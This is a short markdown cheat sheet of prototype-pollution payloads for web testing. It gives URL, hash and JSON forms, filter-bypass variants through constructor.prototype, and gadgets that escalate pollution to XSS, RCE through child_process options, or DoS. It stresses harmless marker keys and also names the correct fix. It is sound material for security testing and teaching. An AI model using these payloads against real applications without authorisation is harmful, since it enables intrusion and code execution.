# Prototype pollution payloads  (adapted from the user's 0daysec notes: Web/prototype-pollution.md)
# Benign: pollute a harmless MARKER key, prove it on a FRESH object. Global effect — scope tightly, no persistent/destructive keys.

## Client-side (URL / hash / JSON input)
```
?__proto__[ppmarker]=polluted
?__proto__.ppmarker=polluted
?constructor[prototype][ppmarker]=polluted          # bypass when __proto__ is filtered
#__proto__[ppmarker]=polluted                        # via location.hash sinks
```
JSON input field:
```json
{"__proto__":{"ppmarker":"polluted"}}
{"constructor":{"prototype":{"ppmarker":"polluted"}}}
```
Confirm in console: `Object.prototype.ppmarker` → `"polluted"`, or `({}).ppmarker === "polluted"`.

## Server-side (JSON body → recursive merge / deep clone)
Target endpoints that merge attacker JSON into an object (`_.merge`, `_.defaultsDeep`, `Object.assign` deep,
`extend`, config/profile/settings updates):
```json
{"__proto__":{"ppmarker":"polluted"}}
{"constructor":{"prototype":{"ppmarker":"polluted"}}}
```
Confirm: a subsequent, unrelated response/object carries `ppmarker` (reflect it via a param the app reads
off a plain object, or an error that echoes an unset-but-now-present property).

## Blocked keys to defeat (why constructor.prototype matters)
Weak filters strip only `__proto__`. Try: `constructor.prototype.x`, `constructor[prototype][x]`,
mixed case, and nested (`__proto__[__proto__][x]`). A correct fix blocks `__proto__`, `prototype`, AND
`constructor`.

## Gadgets (pollution → impact) — hunt in js-analysis sinks
Client-side:
- polluted property read into `innerHTML` / `src` / `onerror` / template config → **XSS** (chain to xss-dom)
- polluted `0`/length/option defaults → logic/DoS
Server-side (Node):
- polluted spawn option (`shell`, `NODE_OPTIONS`, `env`) consumed by `child_process` → **RCE** (benign OOB proof)
- polluted template option / `Function` constructor path → **RCE** (chain to ssti/command-injection verifier criteria)
- polluted required property removed/overwritten → **DoS** (single controlled error only)

## Detection notes
Pollution ≠ reflection: a `__proto__` string appearing in a response is not proof. Proof = the property
exists on a FRESH object the attacker never touched. Tools: ppmap / pphound / DOM Invader (confirm manually).
